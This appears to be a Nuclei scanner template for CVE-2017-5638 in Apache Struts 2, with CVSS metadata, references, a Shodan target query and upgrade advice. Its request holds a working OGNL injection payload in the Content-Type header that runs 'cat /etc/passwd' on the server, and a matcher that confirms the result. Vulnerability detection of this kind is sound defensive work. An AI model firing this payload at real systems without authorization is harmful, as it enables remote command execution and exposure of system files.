id: CVE-2017-5638
info:
  name: Apache Struts 2 - Remote Command Execution
  author: Random_Robbie
  severity: critical
  description: The CVE-2017-5638 vulnerability in Apache Struts 2 allows remote execution
    of arbitrary commands through a crafted HTTP header, as seen in the March 2017
    attack.
  reference:
  - https://github.com/mazen160/struts-pwn
  - https://isc.sans.edu/diary/22169
  - https://github.com/rapid7/metasploit-framework/issues/8064
  - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2017-5638
    cwe-id: CWE-20
  metadata:
    shodan-query: html:"Apache Struts"
    verified: 'true'
    impact: The CVE-2017-5638 vulnerability in Apache Struts 2, which allowed remote
      command injection attacks via crafted HTTP headers, had a significant impact
      as it was exploited in March 2017.
    recommendation: It is highly recommended that any systems running Apache Struts
      2.3.x or 2.5.x be immediately updated to version 2.3.32 or 2.5.10.1 to prevent
      potential remote command execution attacks like CVE-2017-5638.
  tags: cve,cve2017,apache,kev,msf,struts,rce
requests:
- raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: %{(#test=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#cmd="cat
    /etc/passwd",#cmds={"/bin/bash","-c",#cmd},#p=new java.lang.ProcessBuilder(#cmds),#p.redirectErrorStream(true),#process=#p.start(),#b=#process.getInputStream(),#c=new
    java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#rw=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#rw.println(#e),#rw.flush())}

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
